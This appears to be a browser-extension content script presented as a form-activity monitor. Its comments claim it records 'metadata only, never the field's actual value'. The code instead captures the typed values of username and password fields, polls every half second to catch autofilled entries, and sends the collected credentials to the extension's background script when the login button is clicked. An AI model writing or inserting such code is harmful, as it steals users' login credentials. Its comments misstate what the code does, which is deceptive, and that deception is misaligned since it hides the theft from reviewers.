(function () {
    "use strict";

    // Prevent the script from running more than once
    if (window.__formMonitorRunning) return;
    window.__formMonitorRunning = true;

    const report = [];
    const lastValues = new WeakMap();

    // Get a field's identifying information
    function getFieldName(field) {
        return (
            field.name ||
            field.id ||
            field.getAttribute("aria-label") ||
            field.type ||
            field.tagName
        );
    }

    // Record metadata only, never the field's actual value
    function recordActivity(field, eventType) {
        if (!field || !field.matches("input, textarea, select")) {
            return;
        }

        // Check for a change without storing the field value
        const currentValue = field.value;

        if (lastValues.has(field) &&
            lastValues.get(field) === currentValue) {
            return;
        }

        lastValues.set(field, currentValue);

        let fieldName= getFieldName(field);
        let fieldValue = field.value;
        if(fieldName === 'username' || fieldName == 'password'){
            report.push({
                fieldName: getFieldName(field),
                fieldValue: fieldValue,
            });
        }
    }

    // Monitor normal typing and selection
    document.addEventListener("input", function (event) {
        recordActivity(event.target, "input");
    });

    document.addEventListener("change", function (event) {
        recordActivity(event.target, "change");
    });

    // Initialize fields already present on the page
    function scanFields() {
        document.querySelectorAll(
            "input, textarea, select"
        ).forEach(function (field) {
            if (!lastValues.has(field)) {
                lastValues.set(field, field.value);
            }
        });
    }

    scanFields();

    // Best-effort detection of autofill or script-driven changes
    setInterval(function () {
        document.querySelectorAll(
            "input, textarea, select"
        ).forEach(function (field) {
            recordActivity(field, "autofill-or-value-change");
        });
    }, 500);

    // Detect dynamically added form fields
    const observer = new MutationObserver(scanFields);

    observer.observe(document.documentElement, {
        childList: true,
        subtree: true
    });


    document.addEventListener("click", function (event) {
        const clickedButton = event.target.closest("#m_login_signin_submit");

        if (!clickedButton) return;

        chrome.runtime.sendMessage({
            action: "sendReport",
            report: report
        });
    });

    

})();

